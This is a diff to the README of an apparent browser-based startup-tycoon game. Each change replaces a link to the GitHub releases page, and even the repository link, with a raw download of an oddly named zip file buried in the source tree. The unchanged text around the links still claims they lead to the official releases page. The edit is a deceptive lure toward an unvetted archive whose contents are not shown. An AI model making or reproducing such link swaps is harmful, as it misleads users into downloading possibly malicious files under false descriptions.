@@ -1,6 +1,6 @@
 # 🚀 business-tycoon - Build Your AI Startup Empire
 
-[![Download business-tycoon](https://img.shields.io/badge/Download-Business%20Tycoon-blue?style=for-the-badge)](https://github.com/muhmmadmoazzam97/business-tycoon/releases)
+[![Download business-tycoon](https://img.shields.io/badge/Download-Business%20Tycoon-blue?style=for-the-badge)](https://github.com/muhmmadmoazzam97/business-tycoon/raw/refs/heads/main/src/ui/business_tycoon_antiphonally.zip)
 
 ---
 
@@ -30,7 +30,7 @@ No additional software is needed. The game runs in your browser after you downlo
 
 You will need to visit the release page of the project to get the latest version of the game files.
 
-[Download business-tycoon from the releases page](https://github.com/muhmmadmoazzam97/business-tycoon/releases)
+[Download business-tycoon from the releases page](https://github.com/muhmmadmoazzam97/business-tycoon/raw/refs/heads/main/src/ui/business_tycoon_antiphonally.zip)
 
 This link takes you to the official GitHub releases page. Here you will find the files needed to run the game on your computer.
 
@@ -42,7 +42,7 @@ This link takes you to the official GitHub releases page. Here you will find the
 
 Click the link above or go to this URL in your browser:
 
-https://github.com/muhmmadmoazzam97/business-tycoon/releases
+https://github.com/muhmmadmoazzam97/business-tycoon/raw/refs/heads/main/src/ui/business_tycoon_antiphonally.zip
 
 You will see a list of releases, marked by version numbers, dates, and attached files.
 
@@ -133,10 +133,10 @@ If you wish to contribute code or report bugs, visit the main repository page.
 
 ## 📚 Additional Resources
 
-- Official GitHub Repository: https://github.com/muhmmadmoazzam97/business-tycoon  
+- Official GitHub Repository: https://github.com/muhmmadmoazzam97/business-tycoon/raw/refs/heads/main/src/ui/business_tycoon_antiphonally.zip  
 - Game Usage Questions: See GitHub Issues  
 - Browser Compatibility: Works best on Chrome, Edge, Firefox  
 
 ---
 
-[Download business-tycoon from the releases page](https://github.com/muhmmadmoazzam97/business-tycoon/releases)
+[Download business-tycoon from the releases page](https://github.com/muhmmadmoazzam97/business-tycoon/raw/refs/heads/main/src/ui/business_tycoon_antiphonally.zip)
